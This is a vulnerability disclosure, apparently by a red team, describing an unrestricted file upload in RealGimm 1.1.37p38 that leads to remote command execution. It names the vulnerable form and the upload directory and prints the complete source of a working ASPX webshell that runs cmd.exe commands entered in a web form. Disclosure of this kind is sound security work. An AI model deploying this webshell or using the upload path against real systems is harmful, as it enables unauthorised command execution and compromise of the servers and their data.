# CVE-ID | RealGimm by GruppoSCAI - RCE via Unrestricted File Upload
An unrestricted file upload vunerability was found in RealGimm version 1.1.37p38. This vulnerability was eventually exploited to obtain remote command execution by uploading a webshell. What follows is a description of the steps taken to perform the exploit.


## Proof of Concept

### Reaching the vulnerable page

The vulnerable form can be found under the section *patrimonio -> documentale -> gestione*. When that link is clicked, the following pop-up window opens.

![Gestione documentale" window](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/48880855-203a-4cc6-ba67-819d71e4cb8a)

This feature can be used to manage and attach documents to certain database entities. 

### Attaching malicious documents
In order to exploit it, we first search for an *immobile ID*. Once having found one existing item, it is possible to attach a new version of a document by clicking the button highlighted in the following figure.

![Add new document button](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/64cce2fe-a66a-4a7c-8fe3-dd0d605ec81f)


At this point, it is possible to upload a file and verify that the application does not perform any check over the file content that is uploaded. This means that it is possible to upload any malicious file type possible, including .aspx files.

All the files are uploaded into the following directory:

`https://[RealGimm Host]/RealGimmWeb/Temp/Upload/<file_name>`

### Obtaining Remote Command Execution

We proceeded by uploading the following webshell (taken from [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)).

```
<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub

</script>

<html>
<body>    
<form runat="server">        
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
```

Eventually, we visited the uploaded file's URL and found our webshell ready to execute some code.
